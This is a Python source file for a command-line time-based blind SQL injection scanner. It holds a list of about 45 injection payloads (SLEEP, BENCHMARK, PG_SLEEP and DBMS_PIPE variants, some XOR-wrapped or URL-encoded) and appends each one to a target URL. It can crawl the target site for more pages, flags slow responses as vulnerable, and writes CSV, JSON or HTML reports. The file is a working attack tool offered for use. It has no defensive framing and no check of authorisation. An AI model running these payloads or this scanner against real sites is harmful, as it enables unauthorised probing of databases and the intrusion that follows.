import requests
import argparse
import time
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
import threading
import sqlite3
import csv
import json
import os

# Time-based XOR payloads provided
TIME_BASED_XOR_PAYLOADS = [
    "0'XOR(if(now()=sysdate(),sleep(10),0))XOR'X",
    "0\"XOR(if(now()=sysdate(),sleep(10),0))XOR\"Z",
    "‘ AND (SELECT 8839 FROM (SELECT(SLEEP(5)))uzIY) AND ‘mSUA’=’mSUA",
    "'XOR(if((select now()=sysdate()),sleep(10),0))XOR'Z",
    "X'XOR(if(now()=sysdate(),/**/sleep(5)/**/,0))XOR'X",
    "X'XOR(if(now()=sysdate(),(sleep((((5))))),0))XOR'X",
    "X'XOR(if((select now()=sysdate()),BENCHMARK(1000000,md5('xyz')),0))XOR'X",
    "'XOR(SELECT(0)FROM(SELECT(SLEEP(9)))a)XOR'Z",
    "(SELECT(0)FROM(SELECT(SLEEP(6)))a)",
    "'XOR(if(now()=sysdate(),sleep(5*5),0))OR'",
    "'XOR(if(now()=sysdate(),sleep(5*5*0),0))OR'",
    "1 AND (SELECT(0)FROM(SELECT(SLEEP(9)))a)-- wXyW",
    "(SELECT * FROM (SELECT(SLEEP(5)))a)",
    "'%2b(select*from(select(sleep(5)))a)%2b'",
    "CASE//WHEN(LENGTH(version())=10)THEN(SLEEP(6*1))END",
    "';(SELECT 4564 FROM PG_SLEEP(5))--",
    "[')//OR//MID(0x352e362e33332d6c6f67,1,1)//LIKE//5//%23']",
    "DBMS_PIPE.RECEIVE_MESSAGE(%5BINT%5D,5)%20AND%20'bar'='bar",
    "AND 5851=DBMS_PIPE.RECEIVE_MESSAGE([INT],5) AND 'bar'='bar",
    "1' AND (SELECT 6268 FROM (SELECT(SLEEP(5)))ghXo) AND 'IKlK'='IKlK",
    "(select*from(select(sleep(20)))a)",
    "'%2b(select*from(select(sleep(0)))a)%2b'",
    "*'XOR(if(2=2,sleep(10),0))OR'",
    "-1' or 1=IF(LENGTH(ASCII((SELECT USER())))>13, 1, 0)--//",
    "'+(select*from(select(if(1=1,sleep(20),false)))a)+'",
    "2021 AND (SELECT 6868 FROM (SELECT(SLEEP(32)))IiOE)",
    "BENCHMARK(10000000,MD5(CHAR(116)))",
    "'%2bbenchmark(10000000%2csha1(1))%2b'",
    "0'XOR(if(now()=sysdate(),sleep(5),0))XOR'Z",
    "0'XOR(if(now()=sysdate(),sleep(5*1),0))XOR'Z",
    "if(now()=sysdate(),sleep(5),0)",
    "'XOR(if(now()=sysdate(),sleep(5),0))XOR'",
    "'XOR(if(now()=sysdate(),sleep(5*1),0))OR'",
    "0'|(IF((now())LIKE(sysdate()),SLEEP(1),0))|'Z",
    "0'or(now()=sysdate()&&SLEEP(1))or'Z",
    "if(now()=sysdate(),sleep(5),0)/'XOR(if(now()=sysdate(),sleep(5),0))OR'",
    "'XOR(if(now()=sysdate(),sleep(5),0))OR'\"XOR(if(now()=sysdate(),sleep(5),0))OR\"",
    "if(1=1,sleep(5),0)/*'XOR(if(1=1,sleep(5),0))OR'",
    "SLEEP(5)/*' or SLEEP(5) or '\" or SLEEP(5) or \"*/",
    "XOR(if(1337=1337,sleep(5),0))OR\"",
    "0%27XOR(if(now()=sysdate(),sleep(9),0))XOR%27Z",
    "AND 5851=DBMS_PIPE.RECEIVE_MESSAGE([INT],5) AND 'bar'='bar",
    "(select(0)from(select(sleep(5)))v)%2f",
    "'(select(0)from(select(sleep(5)))v)",
    "'+\"+(select(0)from(select(sleep(5)))v)+\"*/'",
]

class TimeBasedSQLiTester:
    def __init__(self, config):
        self.config = config
        self.results = []

    def test_payload(self, url, payload):
        try:
            start_time = time.time()
            r = requests.get(url + payload, cookies=self.config.cookies, headers={'User-Agent': self.config.user_agent}, proxies=self.config.proxies, timeout=self.config.timeout)
            response_time = time.time() - start_time
            if response_time > self.config.sleep_time:
                vulnerable = True
            else:
                vulnerable = False
            self.results.append({
                'url': url,
                'payload': payload,
                'vulnerable': vulnerable,
                'response_time': response_time,
                'status_code': r.status_code,
                'content_length': len(r.content)
            })
        except requests.exceptions.RequestException as e:
            print(f"Request to {url + payload} failed: {e}")

    def run(self):
        urls_to_test = [self.config.url] if not self.config.crawl else self.crawl(self.config.url)
        for url in urls_to_test:
            for payload in TIME_BASED_XOR_PAYLOADS:
                thread = threading.Thread(target=self.test_payload, args=(url, payload))
                thread.start()
                thread.join(self.config.delay)

    def crawl(self, base_url):
        urls = set([base_url])
        try:
            r = requests.get(base_url, headers={'User-Agent': self.config.user_agent}, timeout=self.config.timeout)
            soup = BeautifulSoup(r.text, 'html.parser')
            for link in soup.find_all('a', href=True):
                href = link['href']
                full_url = urljoin(base_url, href)
                parsed_url = urlparse(full_url)
                if base_url in full_url and full_url not in urls:
                    urls.add(full_url)
        except requests.exceptions.RequestException as e:
            print(f"Failed to crawl {base_url}: {e}")
        return list(urls)

    def display_results(self):
        print(f"\n{len(self.results)} URLs found.")
        for result in self.results:
            color = '\033[91m' if result['vulnerable'] else '\033[92m'
            print(f"{color}{result['url']} - Vulnerable: {result['vulnerable']} - "
                  f"Response Time: {result['response_time']:.2f}s - Status: {result['status_code']} - "
                  f"Content Length: {result['content_length']}")

        if self.config.generate_csv:
            with open('time_based_sqli_results.csv', 'w', newline='') as csvfile:
                fieldnames = ['url', 'payload', 'vulnerable', 'response_time', 'status_code', 'content_length']
                writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
                writer.writeheader()
                writer.writerows(self.results)
            print("Results saved to time_based_sqli_results.csv")

        if self.config.generate_json:
            with open('time_based_sqli_results.json', 'w') as jsonfile:
                json.dump(self.results, jsonfile, indent=4)
            print("Results saved to time_based_sqli_results.json")

        if self.config.generate_html:
            html_content = self.generate_html_report()
            with open('time_based_sqli_results.html', 'w') as htmlfile:
                htmlfile.write(html_content)
            print("Results saved to time_based_sqli_results.html")

    def generate_html_report(self):
        report = """
        <html>
        <head><title>Time-Based SQL Injection Test Report</title></head>
        <body>
        <h1>Time-Based SQL Injection Test Report</h1>
        <table border="1">
        <tr><th>URL</th><th>Payload</th><th>Vulnerable</th><th>Response Time (s)</th><th>Status Code</th><th>Content Length</th></tr>
        """
        for result in self.results:
            color = 'red' if result['vulnerable'] else 'green'
            report += f"<tr style='color:{color}'><td>{result['url']}</td><td>{result['payload']}</td><td>{result['vulnerable']}</td><td>{result['response_time']:.2f}</td><td>{result['status_code']}</td><td>{result['content_length']}</td></tr>"
        report += "</table></body></html>"
        return report


class Config:
    def __init__(self, args):
        self.url = args.url
        self.sleep_time = args.sleep_time
        self.delay = args.delay
        self.timeout = args.timeout
        self.user_agent = args.user_agent
        self.cookies = {}
        self.proxies = {}
        self.crawl = args.crawl
        self.generate_csv = args.generate_csv
        self.generate_json = args.generate_json
        self.generate_html = args.generate_html

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Time-Based SQL Injection Testing Tool")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-t", "--sleep-time", type=int, default=5, help="Time to sleep for detection (in seconds)")
    parser.add_argument("-d", "--delay", type=float, default=1.0, help="Delay between requests (in seconds)")
    parser.add_argument("-to", "--timeout", type=float, default=10.0, help="Request timeout (in seconds)")
    parser.add_argument("-ua", "--user-agent", default="Mozilla/5.0 (Windows NT 10.0; Win64; x64)", help="User-Agent header")
    parser.add_argument("-c", "--crawl", action="store_true", help="Crawl the website for more URLs")
    parser.add_argument("--generate-csv", action="store_true", help="Generate CSV report")
    parser.add_argument("--generate-json", action="store_true", help="Generate JSON report")
    parser.add_argument("--generate-html", action="store_true", help="Generate HTML report")
    args = parser.parse_args()

    config = Config(args)
    tester = TimeBasedSQLiTester(config)
    tester.run()
    tester.display_results()
